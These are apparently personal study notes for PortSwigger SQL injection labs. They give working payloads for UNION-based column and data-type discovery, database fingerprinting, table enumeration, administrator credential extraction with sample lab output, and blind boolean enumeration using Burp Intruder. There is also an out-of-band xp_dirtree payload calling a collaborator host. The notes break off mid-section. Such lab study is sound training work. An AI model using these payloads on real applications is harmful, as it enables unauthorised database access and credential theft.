# Portswigger lab Scripts with notes

1. What is SQL Injection?

--> Vulnerability that interferes SQL queries that application makes to a database. 
           Impact: View sensitive information, alter data and delete data.
           It bypasses SQL queries. Suppose a login page asks for username and password. At username you add admin'-- . The SQL query looks like SELECT * from users where username = 'admin' --, password = . -- comments out rest of the query and ' closes the string, logs in as admin. 


2. Types of SQL Injection?

a. In-band (Classic): When SQL payload reflects on the application. Easy to exploit. 

       i) Error-based: Forces database to generate error, giving attacker information.
                      Eg: www.evil.com/app.php?id=' . It gives output as eror in sql syntax with sql server version.
      
      ii) Union-based: UNION SQl operator to combine result of two queries into single result.
                     Eg: www.evi.com/app.php?id=' UNION SELECT username, password FROM users-- . It gives username and password.
      
b. Inferential (Blind): No transfer of data via web app. Only performs when there are certain codition. Takes Long to exploit.
     
        i) Boolean-based: Uses boolean condition to return different result depending whether query returns true or false result.
                          URL: www.evil.com/app.php?id=1. 
                          Payload #1(False): www.evil.com/app.php?id=1 and 1=2. Doesn't give product detail because false.
                          Payload #2(True): www.evil.com/app.php?id=1 and 1=1. Givs product detail because true.
                          Backend Query: select title ftom product where id=1 and 1=1
                          
       ii) Time-based: Delays the result for a specific time, indicating SQL query presence. Eg: If first character of admin hash passowrd is a',wait for 10 seconds. If it takes 10 seconds, it contains a has first password otherwise it doesnot.
      
c. Out-of-band: Using protocol to trigger SQL Injection. Results come to your system like burpcollab.  Eg: '; exec master..xp_dirtree '//burpcollaborator/a'-- 


3. How to find SQL Injection?

--> It depends on blackbox(little info given) and whitebox(source-code given)

       Blackbox: 

              1. Map the aplication: input vectors, endpoints, how app works, etc.
              2. Fuzzing: add SQl characters such as ' or " and look for errors, submit boolean condition, time delay query and out of band query to look for responses.

       Whitebox:

              1. Enable web server and database logging.
              2. Map the application: regex search in code that talk to database.
              3. Code review: Follow code path for input vectors.
              4. Tesst SQLi vulnerability.

********** ERROR BASED **********

***** STEP #1: Determine # of columns *****

 Way #1: UNION
     
      select ? from table1 UNION select NULL, NULL--
       --> error: incorrecet number of columns.
       
      select ? from table1 UNION select NULL, NULL, NULL--
       --> 200 ok: correct number of columns.
       
 Way #2: ORDER BY
 
        select a,b from table1 order by 2-- 
                               order by 2#
        
***** STEP #2: Determine data type of column *****

        select a, b, c from table1 UNION select 'a', NULL, NULL--
        select a, b, c from table1 UNION select NULL, 'a', NULL--
        select a, b, c from table1 UNION select NULL, NULL, 'a'--
         --> error: column is not type text
         --> no error: column is type text.

        for oracle: 'union select 'a', 'a' from dual -- 


***** STEP #3: Finding database version *****

     oracle: select banner from v$version
             select version from v$instance

     mysql and microsoft: select @@version

     postgresql: select version()

        for oracle: ' union select banner, null from v$version--
        for mysql and microsoft: 'UNION select @@version,'a'%23


***** STEP #4: Finding username and password *****

        union select username, password from users--

       ** if only one field works concatenate string based on database

         union select null, username || password from users --  > postgresql and oracle
          "     "       " , username + password from users -- > microsoft
          "      "      " , username  password from users -- > mysql
                             concat(username,password)

      Found username and password: Gifts' union select null, username || '~' || password from users--
            administrator~z5wp402vuidu2y59oaai


***** STEP #5: Finding Database Content *****

        oracle:	SELECT * FROM all_tables
                SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' 

        non-oracle: SELECT * FROM information_schema.tables
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

        1) * is a place holder for tables NAME. search For information_schema.tables on google to get table names  #(users_table)

               non-oracle:  'union select table_name, null from information_schema.tables --
               oracle: ' union select table_name,null from all_tables--
        
        2) It contains lists of database name. lets pick users_acinmi for non-oracle and users_roomix for oracle then  #(username_column,password_column)
              non-oracle: ' UNION SELECT column_name, null from information_schema.columns WHERE table_name = 'users_acinmi' --
                                     output: username_wuiqfp
                                             password_fhdiit 

                oracle: ' union select column_name,null from all_tab_columns where table_name='USERS_ROOIMX'--
                                     output: USERNAME_ICWHMD
                                             PASSWORD_DETRFJ                                 
 

        3) Output the username and password  #(administrator_table)

                non-oracle: ' UNION select username_wuiqfp, password_fhdiit from users_acinmi--
                                    output: administrator
	                                    9ro90x5y3ztmsv21nwm0

                oracle: ' union select USERNAME_ICWHMD,PASSWORD_DETRFJ from USERS_ROOIMX--
                                     output: administrator
	                                     x7e2jmfnqacfb1bxe3m0



********** BLIND SQL **********

*** Blind SQLI with conditional responses ***

1. Confirm that the paramter is vulnerable to blind SQLi

cookie query:   select tracking-id from tracking-table where trackingId='23f23fdxqd'

        -> If tracking id exists -> query return value -> welcome back msg

        -> If tracking id doesn't exists -> query returns nothing -> no welcome msg

select tracking-id from tracking-table where trackingId='23f23fdxqd' and 1=1--'
        -> TRUE -> WELCOME back msg

select tracking-id from tracking-table where trackingId='23f23fdxqd' and 1=0--'
        -> FALSE -> no WELCOME back msg

2. Confirm that we have users table

select tracking-id from tracking-table where trackingId='23f23fdxqd' and (select 'x' from users LIMIT 1) = 'x'--'
-> TRUE -> users table exists in database

3. Confirm that username administrator exists users table

select tracking-id from tracking-table where trackingId='23f23fdxqd' and (select username from users where username='administrator') = 'administrator'--'
        -> administrator user exists

4. Enumerate password of the administrator user

select tracking-id from tracking-table where trackingId='23f23fdxqd' and (select username from users where username='administrator' and LENGTH (password)>1) = 'administrator'--' 
        -> Use burp to check how many length is there in the password. $1$. 20 returned false, so it contains 20 character.

  **** Using substring to find password. It checks one by one character ****

select tracking-id from tracking-table where trackingId='23f23fdxqd' and (select substring(password,1,1) from users where username='administrator') = 'a'--'
        -> burp,(payload-type=bruteforcer): $a$. If 1st letter contains letter 'c' go to 2nd letter.
        -> burp payload(cluster-bomb): ' and (select substring(password,$1$,1) from users where username='administrator' and LENGTH (password)>1) = '$a$'--' 
        -> 1st type: number from 1 to 20. 2nd type: bruteforcer.



***** Blind SQLI with conditional errors *****

1. Confirm that the parameter is vulnerable

' || (select '') || '  > 200ok: non-oracle
' || (select '' from dual) || '  > 200ok: oracle

2. Confirm that the users table exists in the database